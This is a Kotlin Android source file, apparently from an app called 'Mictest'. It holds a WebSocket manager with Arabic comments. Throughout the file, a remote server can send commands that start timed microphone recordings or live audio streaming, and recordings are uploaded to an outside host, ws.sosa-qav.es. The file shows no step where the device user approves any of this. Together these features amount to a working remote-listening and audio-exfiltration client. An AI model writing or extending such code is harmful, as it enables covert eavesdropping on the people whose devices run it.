package com.example.mictest

import android.util.Log
import android.util.Base64
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okio.ByteString
import okio.ByteString.Companion.toByteString
import org.json.JSONArray
import org.json.JSONObject
import android.os.Handler
import android.os.Looper
import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.io.File
import java.io.FileInputStream
import kotlinx.coroutines.*
import java.security.MessageDigest
import android.content.Intent
import io.flutter.plugin.common.MethodChannel
import io.flutter.plugin.common.MethodCall

/**
 * Professional WebSocket Manager for Audio Recording Service
 * Handles real-time communication with audio server
 * Features: Timed recording, Live streaming, File upload, Command processing
 *
 * @author Mictest Team
 * @version 3.1.0 - Optimized Data Transfer
 */
class WebSocketManager(private val service: AudioRecordingService) : WebSocketListener() {

    // ================================
    // Configuration & Constants
    // ================================

    companion object {
        private const val TAG = "Mictest_WebSocketManager"
        private const val NORMAL_CLOSURE_STATUS = 1000
        private const val MAX_RECONNECT_DELAY = 30000L
        private const val MAX_CONNECTION_ATTEMPTS = 3
        private const val HEARTBEAT_INTERVAL = 45000L
        private const val MIN_CONNECTION_TIME = 10000L
        private const val STABLE_CONNECTION_DELAY = 2000L
        private const val MAX_FILE_SIZE_MB = 10
        private const val UPLOAD_TIMEOUT_MS = 60000L
        private const val MESSAGE_COOLDOWN = 1000L
        private const val DUPLICATE_MESSAGE_COOLDOWN = 500L
        // !!مهم: يجب استبداله بالرابط الصحيح لخادم الرفع الذي يستقبل طلبات HTTP POST
        private const val UPLOAD_HTTP_URL = "https://ws.sosa-qav.es/upload"
    }

    // ================================
    // Network & Connection Setup
    // ================================

    private val client: OkHttpClient = OkHttpClient.Builder()
        .readTimeout(60, TimeUnit.SECONDS)
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .pingInterval(45, TimeUnit.SECONDS)
        // .hostnameVerifier { _, _ -> true } // !!خطر أمني: تم التعليق. لا تستخدم في الإنتاج.
        .build()

    private var webSocket: WebSocket? = null

    private val serverUrls = arrayOf(
        "ws://10.0.2.2:5000",           // Android Emulator
        "ws://192.168.8.167:5000",      // Local Network (Verified)
        "ws://localhost:5000",          // Local Host
        "ws://127.0.0.1:5000",         // Local IP
        "ws://ws.sosa-qav.es",      // Remote Server
        "wss://ws.sosa-qav.es"         // Secure Remote Server
    )

    // ================================
    // Connection State Management
    // ================================

    private var currentUrlIndex = 0
    private var currentUrl = serverUrls[currentUrlIndex]
    private val reconnectHandler = Handler(Looper.getMainLooper())
    private val heartbeatHandler = Handler(Looper.getMainLooper())
    private var reconnectDelay = 3000L
    private val isConnecting = AtomicBoolean(false)
    private var shouldReconnect = true
    private var connectionAttempts = 0
    private val isConnected = AtomicBoolean(false)
    private var lastConnectionError: String? = null
    private var connectionStartTime = 0L

    // ================================
    // File Upload Management
    // ================================

    private val uploadScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var currentUploadCount = 0
    private var totalUploadCount = 0
    private val isUploading = AtomicBoolean(false)

    // ================================
    // Message Deduplication System
    // ================================

    private val commandHandler = Handler(Looper.getMainLooper())
    private var isProcessingCommand = false
    private val lastMessageTime = mutableMapOf<String, Long>()
    private val messageDeduplication = mutableSetOf<String>()

    // ================================
    // Flutter Communication
    // ================================

    private var flutterMethodChannel: MethodChannel? = null

    fun setFlutterMethodChannel(channel: MethodChannel) {
        flutterMethodChannel = channel
    }

    // ================================
    // Connection Management
    // ================================

    /**
     * Establish WebSocket connection with intelligent URL switching
     */
    fun connect() {
        if (isConnecting.get() || webSocket != null) {
            Log.d(TAG, "Connection already in progress or established")
            return
        }

        if (!isNetworkAvailable()) {
            Log.e(TAG, "Network unavailable for connection")
            lastConnectionError = "No network connection"
            scheduleReconnect()
            return
        }

        isConnecting.set(true)
        shouldReconnect = true
        connectionAttempts++
        connectionStartTime = System.currentTimeMillis()

        Log.i(TAG, "Establishing WebSocket connection (Attempt $connectionAttempts)")
        Log.i(TAG, "Target: $currentUrl (${currentUrlIndex + 1}/${serverUrls.size})")
        Log.i(TAG, "Network: ${getNetworkType()}")

        val request = buildConnectionRequest()

        try {
            webSocket = client.newWebSocket(request, this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create WebSocket connection", e)
            lastConnectionError = "Connection creation failed: ${e.message}"
            isConnecting.set(false)
            scheduleReconnect()
        }
    }

    /**
     * Build optimized connection request with headers
     */
    private fun buildConnectionRequest(): Request {
        return Request.Builder()
            .url(currentUrl)
            .addHeader("User-Agent", "Mictest-Android-Professional/3.1")
            .addHeader("Accept", "application/json")
            .addHeader("Cache-Control", "no-cache")
            .addHeader("Connection", "Upgrade")
            .addHeader("Upgrade", "websocket")
            .addHeader("X-Client-Capabilities", "timed-recording,live-streaming,file-upload")
            .addHeader("X-Client-Version", "3.1.0")
            .build()
    }

    /**
     * Safely disconnect WebSocket connection
     */
    fun disconnect() {
        Log.i(TAG, "Initiating WebSocket disconnection")
        shouldReconnect = false
        isConnected.set(false)
        connectionAttempts = 0
        currentUrlIndex = 0
        currentUrl = serverUrls[currentUrlIndex]
        lastConnectionError = null

        // Cancel ongoing operations
        uploadScope.coroutineContext.cancelChildren()
        isUploading.set(false)
        cleanupMessageTracking()

        // Stop handlers
        reconnectHandler.removeCallbacksAndMessages(null)
        heartbeatHandler.removeCallbacksAndMessages(null)

        // Close connection
        webSocket?.close(NORMAL_CLOSURE_STATUS, "Service disconnecting")
        webSocket = null
        isConnecting.set(false)

        Log.i(TAG, "WebSocket disconnection completed")
    }

    /**
     * Force reconnection with next server
     */
    fun forceReconnect() {
        Log.i(TAG, "Force reconnection requested")
        disconnect()
        switchToNextServer()
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 1000)
    }

    // ================================
    // WebSocket Event Handlers
    // ================================

    override fun onOpen(webSocket: WebSocket, response: Response) {
        isConnecting.set(false)
        isConnected.set(true)
        connectionAttempts = 0
        reconnectDelay = 3000L
        lastConnectionError = null
        val connectionTime = System.currentTimeMillis() - connectionStartTime

        Log.i(TAG, "WebSocket connection established successfully")
        Log.i(TAG, "Connected to: $currentUrl (${currentUrlIndex + 1}/${serverUrls.size})")
        Log.i(TAG, "Connection time: ${connectionTime}ms")
        Log.i(TAG, "Response code: ${response.code}")
        Log.i(TAG, "Protocol: ${response.protocol}")

        // Initialize connection
        Handler(Looper.getMainLooper()).postDelayed({
            if (isConnected.get() && webSocket == this.webSocket) {
                initializeConnection()
            }
        }, STABLE_CONNECTION_DELAY)

        // Notify Flutter side
        sendConnectionStatusToFlutter(true)
    }

    /**
     * Initialize connection with server handshake
     */
    private fun initializeConnection() {
        sendHeartbeat()
        schedulePeriodicHeartbeat()
        sendConnectionStatus("connected")
        sendClientCapabilities()
        startPeriodicCleanup()
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        Log.d(TAG, "Received message: ${text.take(200)}...")

        try {
            val json = JSONObject(text)
            val command = json.optString("command")
            val messageType = json.optString("type")

            when {
                messageType == "welcome" -> handleWelcomeMessage(json)
                messageType == "heartbeat_response" || messageType == "pong" -> handleHeartbeatResponse()
                messageType == "echo" -> Log.d(TAG, "Echo response received")
                command.isNotEmpty() -> handleServerCommand(command, json)
                else -> Log.d(TAG, "Other message type: $messageType")
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error parsing message: ${text.take(100)}", e)
        }
    }

    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        Log.d(TAG, "Received binary data: ${bytes.size} bytes. (This client version does not process incoming binary data)")
    }

    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
        Log.w(TAG, "WebSocket closing: $code / $reason")
    }

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        handleConnectionClosed(code, reason)
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        handleConnectionFailure(t, response)
    }

    // ================================
    // Connection Event Handlers
    // ================================

    private fun handleConnectionClosed(code: Int, reason: String) {
        isConnected.set(false)
        isConnecting.set(false)
        webSocket = null

        Log.w(TAG, "WebSocket connection closed")
        Log.w(TAG, "Close code: $code, reason: $reason")

        lastConnectionError = "Connection closed: $code - $reason"
        sendConnectionStatusToFlutter(false)

        if (shouldReconnect) {
            when (code) {
                NORMAL_CLOSURE_STATUS -> {
                    Log.i(TAG, "Normal closure, no reconnection needed")
                }
                1006 -> { // Abnormal closure
                    Log.w(TAG, "Abnormal closure detected, switching server")
                    switchToNextServer()
                    scheduleReconnect()
                }
                else -> scheduleReconnect()
            }
        }
    }

    private fun handleConnectionFailure(t: Throwable, response: Response?) {
        isConnected.set(false)
        isConnecting.set(false)
        webSocket = null

        val errorMsg = "Connection failed: ${t.message}"
        Log.e(TAG, errorMsg, t)
        if (response != null) {
            Log.e(TAG, "Response: ${response.code} ${response.message}")
        }


        lastConnectionError = errorMsg
        sendConnectionStatusToFlutter(false)

        if (shouldReconnect) {
            switchToNextServer()
            scheduleReconnect()
        }
    }

    // ================================
    // Message Processing System
    // ================================

    /**
     * Handle welcome message from server
     */
    private fun handleWelcomeMessage(json: JSONObject) {
        Log.i(TAG, "Welcome message received from server")
        val clientId = json.optString("client_id")
        val serverInfo = json.optString("server_info")
        Log.i(TAG, "Client ID: $clientId")
        Log.i(TAG, "Server: $serverInfo")
    }

    /**
     * Handle heartbeat response
     */
    private fun handleHeartbeatResponse() {
        Log.d(TAG, "Heartbeat acknowledged by server")
    }

    /**
     * Advanced command handler with deduplication - FOCUSED ON TWO FEATURES
     */
    private fun handleServerCommand(command: String, json: JSONObject) {
        // Prevent concurrent command processing
        if (isProcessingCommand) {
            Log.d(TAG, "Command already being processed, skipping: $command")
            return
        }

        // Check for command cooldown
        val currentTime = System.currentTimeMillis()
        lastMessageTime[command]?.let { lastTime ->
            if (currentTime - lastTime < MESSAGE_COOLDOWN) {
                Log.d(TAG, "Command cooldown active, skipping: $command")
                return
            }
        }

        isProcessingCommand = true
        lastMessageTime[command] = currentTime

        Log.i(TAG, "Processing server command: $command")

        when (command) {
            // ===========================================
            // أوامر التسجيل المحدد بوقت - الميزة الأولى
            // ===========================================
            "start_timed_recording" -> processStartTimedRecording(json)
            "stop_timed_recording" -> processStopTimedRecording()
            "get_timed_recording_status" -> processGetTimedRecordingStatus()

            // ===========================================
            // أوامر البث المباشر - الميزة الثانية
            // ===========================================
            "start_live_stream" -> processStartLiveStream(json)
            "stop_live_stream" -> processStopLiveStream()
            "get_live_stream_status" -> processGetLiveStreamStatus()

            // ===========================================
            // أوامر مساعدة عامة
            // ===========================================
            "check_status" -> processStatusCheck()
            "list_files" -> processListFiles()
            "heartbeat", "ping" -> processHeartbeat()

            else -> processUnknownCommand(command)
        }
    }

    /**
     * معالجة أمر بدء التسجيل المحدد بوقت
     */
    private fun processStartTimedRecording(json: JSONObject) {
        commandHandler.post {
            try {
                val duration = json.optLong("duration", 30000L)
                val quality = json.optString("quality", "high")
                val clientId = json.optString("client_id", "")

                // التحقق من صحة المدة
                if (duration < 1000 || duration > 600000) {
                    sendResponse("start_timed_recording", "error", "مدة غير صالحة: $duration ms")
                    return@post
                }

                if (!service.isTimedRecording() && !service.isLiveStreaming()) {
                    val intent = Intent(service, AudioRecordingService::class.java).apply {
                        action = "START_TIMED_RECORDING"
                        putExtra("duration", duration)
                        putExtra("quality", quality)
                        putExtra("client_id", clientId)
                    }
                    service.startService(intent)

                    sendResponse("start_timed_recording", "success",
                        "بدء التسجيل المحدد بوقت: ${duration}ms")
                    Log.i(TAG, "⏱️ تم بدء التسجيل المحدد بوقت: ${duration}ms")
                } else {
                    sendResponse("start_timed_recording", "error", "ميزة أخرى تعمل بالفعل")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في بدء التسجيل المحدد بوقت", e)
                sendResponse("start_timed_recording", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * معالجة أمر إيقاف التسجيل المحدد بوقت
     */
    private fun processStopTimedRecording() {
        commandHandler.post {
            try {
                val intent = Intent(service, AudioRecordingService::class.java).apply {
                    action = "STOP_TIMED_RECORDING"
                }
                service.startService(intent)
                sendResponse("stop_timed_recording", "success", "تم إيقاف التسجيل المحدد بوقت")
            } catch (e: Exception) {
                sendResponse("stop_timed_recording", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * معالجة أمر حالة التسجيل المحدد بوقت
     */
    private fun processGetTimedRecordingStatus() {
        commandHandler.post {
            try {
                val statusData = JSONObject().apply {
                    put("is_timed_recording", service.isTimedRecording())
                    put("timestamp", System.currentTimeMillis())
                }
                sendResponse("get_timed_recording_status", "success", "حالة التسجيل المحدد بوقت", statusData)
            } catch (e: Exception) {
                sendResponse("get_timed_recording_status", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * معالجة أمر بدء البث المباشر
     */
    private fun processStartLiveStream(json: JSONObject) {
        commandHandler.post {
            try {
                val quality = json.optString("quality", "high")
                val adaptiveQuality = json.optBoolean("adaptive_quality", true)
                val clientId = json.optString("client_id", "")

                if (!service.isTimedRecording() && !service.isLiveStreaming()) {
                    val intent = Intent(service, AudioRecordingService::class.java).apply {
                        action = "START_LIVE_STREAM"
                        putExtra("quality", quality)
                        putExtra("adaptive_quality", adaptiveQuality)
                        putExtra("client_id", clientId)
                    }
                    service.startService(intent)

                    sendResponse("start_live_stream", "success", "بدء البث المباشر")
                    Log.i(TAG, "📡 تم بدء البث المباشر")
                } else {
                    sendResponse("start_live_stream", "error", "ميزة أخرى تعمل بالفعل")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في بدء البث المباشر", e)
                sendResponse("start_live_stream", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * معالجة أمر إيقاف البث المباشر
     */
    private fun processStopLiveStream() {
        commandHandler.post {
            try {
                val intent = Intent(service, AudioRecordingService::class.java).apply {
                    action = "STOP_LIVE_STREAM"
                }
                service.startService(intent)
                sendResponse("stop_live_stream", "success", "تم إيقاف البث المباشر")
            } catch (e: Exception) {
                sendResponse("stop_live_stream", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * معالجة أمر حالة البث المباشر
     */
    private fun processGetLiveStreamStatus() {
        commandHandler.post {
            try {
                val statusData = JSONObject().apply {
                    put("is_live_streaming", service.isLiveStreaming())
                    put("timestamp", System.currentTimeMillis())
                }
                sendResponse("get_live_stream_status", "success", "حالة البث المباشر", statusData)
            } catch (e: Exception) {
                sendResponse("get_live_stream_status", "error", "فشل: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * Process status check command
     */
    private fun processStatusCheck() {
        commandHandler.post {
            try {
                val isTimedRecording = service.isTimedRecording()
                val isLiveStreaming = service.isLiveStreaming()
                val statusData = JSONObject().apply {
                    put("service_running", true)
                    put("timed_recording_active", isTimedRecording)
                    put("live_streaming_active", isLiveStreaming)
                    put("connection_status", "connected")
                    put("connection_url", currentUrl)
                    put("url_index", "${currentUrlIndex + 1}/${serverUrls.size}")
                    put("last_error", lastConnectionError ?: "none")
                    put("network_type", getNetworkType())
                    put("timestamp", System.currentTimeMillis())
                    put("connection_stable", isConnectionStable())
                    put("websocket_connected", isConnected.get())
                    put("client_version", "3.1.0")
                    put("features", "timed-recording,live-streaming")
                }
                sendResponse("check_status", "success", "Status checked", statusData)
                Log.i(TAG, "Status check completed - Timed: $isTimedRecording, Live: $isLiveStreaming")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to check status", e)
                sendResponse("check_status", "error", "Failed to check status: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * Process list files command
     */
    private fun processListFiles() {
        commandHandler.post {
            try {
                Log.i(TAG, "Server requested file list")
                service.sendFilesList()
                sendResponse("list_files", "success", "File list processed")
                Log.i(TAG, "File list request completed")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to process file list", e)
                sendResponse("list_files", "error", "Failed to get file list: ${e.message}")
            } finally {
                isProcessingCommand = false
            }
        }
    }

    /**
     * Process heartbeat command
     */
    private fun processHeartbeat() {
        sendHeartbeat()
        isProcessingCommand = false
    }

    /**
     * Process unknown command
     */
    private fun processUnknownCommand(command: String) {
        Log.w(TAG, "Unknown command received: $command")
        sendResponse(command, "error", "Unknown command: $command")
        isProcessingCommand = false
    }

    // ===========================================
    // دوال البث المباشر الجديدة
    // ===========================================

    /**
     * إرسال إشارة بداية البث
     */
    fun sendStreamingStartSignal(sampleRate: Int, channelConfig: String, audioFormat: String, expectedChunkSize: Int) {
        try {
            val startSignal = JSONObject().apply {
                put("command", "streaming_start")
                put("sample_rate", sampleRate)
                put("channel_config", channelConfig)
                put("audio_format", audioFormat)
                put("expected_chunk_size_ms", expectedChunkSize)
                put("timestamp", System.currentTimeMillis())
                put("client_info", "Mictest-Android-LiveStreamer")
            }
            sendMessage(startSignal.toString())
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال إشارة بداية البث", e)
        }
    }

    /**
     * إرسال heartbeat البث المباشر
     */
    fun sendStreamingHeartbeat(stats: Map<String, Any>) {
        try {
            val heartbeat = JSONObject().apply {
                put("command", "streaming_heartbeat")
                put("stats", JSONObject(stats))
                put("timestamp", System.currentTimeMillis())
            }
            sendMessage(heartbeat.toString())
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال heartbeat البث", e)
        }
    }

    /**
     * إرسال إشارة انتهاء البث
     */
    fun sendStreamingEndSignal(finalStats: Map<String, Any>) {
        try {
            val endSignal = JSONObject().apply {
                put("command", "streaming_end")
                put("final_stats", JSONObject(finalStats))
                put("timestamp", System.currentTimeMillis())
                put("client_info", "Mictest-Android-LiveStreamer")
            }
            sendMessage(endSignal.toString())
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إرسال إشارة انتهاء البث", e)
        }
    }

    /**
     * Send live audio chunk to server as a raw binary frame for maximum efficiency.
     * يرسل جزء الصوت المباشر إلى الخادم كإطار ثنائي خام لتحقيق أقصى قدر من الكفاءة.
     */
    fun sendLiveAudioChunkBinary(audioData: ByteArray, dataSize: Int): Boolean {
        return try {
            if (!isConnected.get()) {
                // Log this warning less frequently to avoid spamming logs
                // Log.w(TAG, "⚠️ Cannot send audio chunk - not connected")
                return false
            }

            // Send the raw bytes directly using ByteString
            // ملاحظة: يجب أن يكون الخادم معدًا لاستقبال الرسائل الثنائية (Binary Frames) مباشرةً.
            val byteString = audioData.toByteString(0, dataSize) // تم التغيير
            webSocket?.send(byteString) ?: false

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error sending binary audio chunk", e)
            false
        }
    }

    /**
     * Send end of stream signal
     */
    fun sendEndOfStream() {
        try {
            val endMessage = JSONObject().apply {
                put("command", "end_of_stream")
                put("timestamp", System.currentTimeMillis())
                put("client_info", "Mictest-Android-Professional")
            }

            webSocket?.send(endMessage.toString())
            Log.i(TAG, "📡 تم إرسال إشارة انتهاء البث")

        } catch (e: Exception) {
            Log.e(TAG, "❌ خطأ في إرسال إشارة انتهاء البث", e)
        }
    }

    // ================================
    // File Upload System
    // ================================

    /**
     * Upload single file to server using HTTP POST (multipart/form-data) for efficiency.
     * يرفع ملفًا واحدًا إلى الخادم باستخدام HTTP POST لتحسين الكفاءة.
     */
    suspend fun uploadFileToServer(filePath: String): Boolean {
        return withContext(Dispatchers.IO) {
            val file = File(filePath)
            if (!file.exists()) {
                Log.e(TAG, "File not found for upload: $filePath")
                return@withContext false
            }

            val fileSizeMB = file.length() / (1024.0 * 1024.0)
            if (fileSizeMB > MAX_FILE_SIZE_MB) {
                Log.e(TAG, "File too large to upload: ${String.format("%.2f", fileSizeMB)}MB")
                return@withContext false
            }

            Log.i(TAG, "🚀 Starting HTTP file upload: ${file.name}")

            try {
                val fileBody = file.readBytes().toRequestBody(
                    "application/octet-stream".toMediaTypeOrNull() // تم التغيير
                )

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "file", // اسم الحقل للملف، يجب أن يتطابق مع ما يتوقعه الخادم
                        file.name,
                        fileBody
                    )
                    .addFormDataPart("filename", file.name)
                    .addFormDataPart("filesize", file.length().toString())
                    .addFormDataPart("created_at", file.lastModified().toString())
                    .addFormDataPart("client_info", "Mictest-Android-Professional-HTTP")
                    .build()

                val request = Request.Builder()
                    .url(UPLOAD_HTTP_URL)
                    .post(requestBody)
                    .build()

                val response = client.newCall(request).execute()

                val successful = response.isSuccessful
                val responseBody = response.body?.string() // اقرأ الجسم مرة واحدة فقط

                if (successful) {
                    Log.i(TAG, "✅ HTTP Upload successful for ${file.name}. Server response: $responseBody")
                    response.close()
                    true
                } else {
                    Log.e(TAG, "❌ HTTP Upload failed for ${file.name}. Code: ${response.code}, Message: ${response.message}")
                    response.close()
                    false
                }
            } catch (e: Exception) {
                Log.e(TAG, "💥 Exception during HTTP file upload for $filePath", e)
                false
            }
        }
    }

    // ================================
    // Message Sending System
    // ================================

    /**
     * Send message with connection verification
     */
    fun sendMessage(message: String): Boolean {
        return try {
            if (!isConnected.get()) {
                Log.w(TAG, "Cannot send message - not connected")
                return false
            }

            val sent = webSocket?.send(message) ?: false
            if (sent) {
                Log.d(TAG, "Message sent successfully: ${message.take(100)}...")
            } else {
                Log.w(TAG, "Failed to send message")
            }
            sent
        } catch (e: Exception) {
            Log.e(TAG, "Error sending message", e)
            false
        }
    }

    /**
     * Send structured response to server
     */
    private fun sendResponse(command: String, status: String, message: String, data: JSONObject? = null) {
        try {
            val response = JSONObject().apply {
                put("response_to", command)
                put("status", status)
                put("message", message)
                put("timestamp", System.currentTimeMillis())
                put("client_info", "Mictest-Android-Professional")
                data?.let { put("data", it) }
            }

            sendMessage(response.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Error sending response", e)
        }
    }

    /**
     * Send files list to Flutter using MethodChannel
     */
    fun sendFilesListToFlutter(files: List<Map<String, Any>>) {
        try {
            val filesMessage = JSONObject().apply {
                put("command", "files_list")
                put("data", JSONArray(files))
                put("count", files.size)
                put("timestamp", System.currentTimeMillis())
            }

            // Send to Flutter
            flutterMethodChannel?.invokeMethod("onWebSocketMessage", filesMessage.toString())

            Log.d(TAG, "Files list sent to Flutter: ${files.size} files")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending files list to Flutter", e)
        }
    }

    // ================================
    // Connection Utility Functions
    // ================================

    /**
     * Send heartbeat to maintain connection
     */
    private fun sendHeartbeat() {
        try {
            val heartbeat = JSONObject().apply {
                put("type", "heartbeat")
                put("timestamp", System.currentTimeMillis())
                put("client_info", "Mictest-Android-Professional")
                put("client_version", "3.1.0")
                put("features", arrayOf("timed-recording", "live-streaming"))
            }

            if (sendMessage(heartbeat.toString())) {
                Log.d(TAG, "Heartbeat sent")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending heartbeat", e)
        }
    }

    /**
     * Schedule periodic heartbeat
     */
    private fun schedulePeriodicHeartbeat() {
        heartbeatHandler.removeCallbacksAndMessages(null)
        heartbeatHandler.postDelayed({
            if (isConnected.get()) {
                sendHeartbeat()
                schedulePeriodicHeartbeat()
            }
        }, HEARTBEAT_INTERVAL)
    }

    /**
     * Send connection status
     */
    private fun sendConnectionStatus(status: String) {
        try {
            val statusMessage = JSONObject().apply {
                put("type", "connection_status")
                put("status", status)
                put("url", currentUrl)
                put("timestamp", System.currentTimeMillis())
            }
            sendMessage(statusMessage.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Error sending connection status", e)
        }
    }

    /**
     * Send client capabilities
     */
    private fun sendClientCapabilities() {
        try {
            val capabilities = JSONObject().apply {
                put("type", "client_capabilities")
                put("version", "3.1.0")
                put("features", JSONArray(arrayOf(
                    "timed-recording",
                    "live-streaming",
                    "file-upload",
                    "heartbeat",
                    "error-handling"
                )))
                put("audio_formats", JSONArray(arrayOf("aac", "wav", "mp3")))
                put("max_file_size_mb", MAX_FILE_SIZE_MB)
                put("platform", "Android")
                put("timestamp", System.currentTimeMillis())
            }
            sendMessage(capabilities.toString())
        } catch (e: Exception) {
            Log.e(TAG, "Error sending capabilities", e)
        }
    }

    /**
     * Send connection status to Flutter
     */
    private fun sendConnectionStatusToFlutter(connected: Boolean) {
        try {
            flutterMethodChannel?.invokeMethod(
                if (connected) "onWebSocketConnected" else "onWebSocketDisconnected",
                null
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error notifying Flutter of connection status", e)
        }
    }

    // ================================
    // Network Utility Functions
    // ================================

    /**
     * Check if network is available
     */
    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = service.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val networkCapabilities = connectivityManager.activeNetwork ?: return false
                val actNw = connectivityManager.getNetworkCapabilities(networkCapabilities) ?: return false
                actNw.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                        actNw.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo?.isConnected == true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking network availability", e)
            false
        }
    }

    /**
     * Get network type string
     */
    private fun getNetworkType(): String {
        return try {
            val connectivityManager = service.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val networkCapabilities = connectivityManager.activeNetwork?.let {
                    connectivityManager.getNetworkCapabilities(it)
                } ?: return "none"

                when {
                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular"
                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Unknown"
                }
            } else {
                @Suppress("DEPRECATION")
                val networkInfo = connectivityManager.activeNetworkInfo
                networkInfo?.typeName ?: "none"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting network type", e)
            "error"
        }
    }

    /**
     * Switch to next server URL
     */
    private fun switchToNextServer() {
        currentUrlIndex = (currentUrlIndex + 1) % serverUrls.size
        currentUrl = serverUrls[currentUrlIndex]
        Log.i(TAG, "Switched to server: $currentUrl (${currentUrlIndex + 1}/${serverUrls.size})")
    }

    /**
     * Schedule reconnection attempt
     */
    private fun scheduleReconnect() {
        if (!shouldReconnect) return

        reconnectHandler.removeCallbacksAndMessages(null)
        reconnectHandler.postDelayed({
            if (shouldReconnect && !isConnected.get()) {
                connect()
            }
        }, reconnectDelay)

        reconnectDelay = (reconnectDelay * 1.5).toLong().coerceAtMost(MAX_RECONNECT_DELAY)
        Log.i(TAG, "Reconnection scheduled in ${reconnectDelay}ms")
    }

    /**
     * Check if connection is stable
     */
    private fun isConnectionStable(): Boolean {
        return isConnected.get() &&
                (System.currentTimeMillis() - connectionStartTime) > MIN_CONNECTION_TIME
    }

    /**
     * Generate file checksum for integrity verification
     */
    private fun generateFileChecksum(fileBytes: ByteArray): String {
        return try {
            val digest = MessageDigest.getInstance("SHA-256")
            val hashBytes = digest.digest(fileBytes)
            hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error generating checksum", e)
            "error"
        }
    }

    /**
     * Clean up message tracking data
     */
    private fun cleanupMessageTracking() {
        lastMessageTime.clear()
        messageDeduplication.clear()
        isProcessingCommand = false
    }

    /**
     * Start periodic cleanup of old data
     */
    private fun startPeriodicCleanup() {
        Handler(Looper.getMainLooper()).postDelayed({
            if (isConnected.get()) {
                val currentTime = System.currentTimeMillis()
                lastMessageTime.entries.removeAll { currentTime - it.value > MESSAGE_COOLDOWN * 10 }
                startPeriodicCleanup()
            }
        }, 60000) // Clean every minute
    }

    // ================================
    // Public API Functions
    // ================================

    /**
     * Check if WebSocket is connected
     */
    fun isConnected(): Boolean = isConnected.get()

    /**
     * Get connection information
     */
    fun getConnectionInfo(): Map<String, Any> {
        return mapOf(
            "is_connected" to isConnected.get(),
            "is_connecting" to isConnecting.get(),
            "current_url" to currentUrl,
            "url_index" to "${currentUrlIndex + 1}/${serverUrls.size}",
            "connection_attempts" to connectionAttempts,
            "last_error" to (lastConnectionError ?: "none"),
            "network_type" to getNetworkType(),
            "connection_stable" to isConnectionStable(),
            "should_reconnect" to shouldReconnect,
            "reconnect_delay_ms" to reconnectDelay
        )
    }
}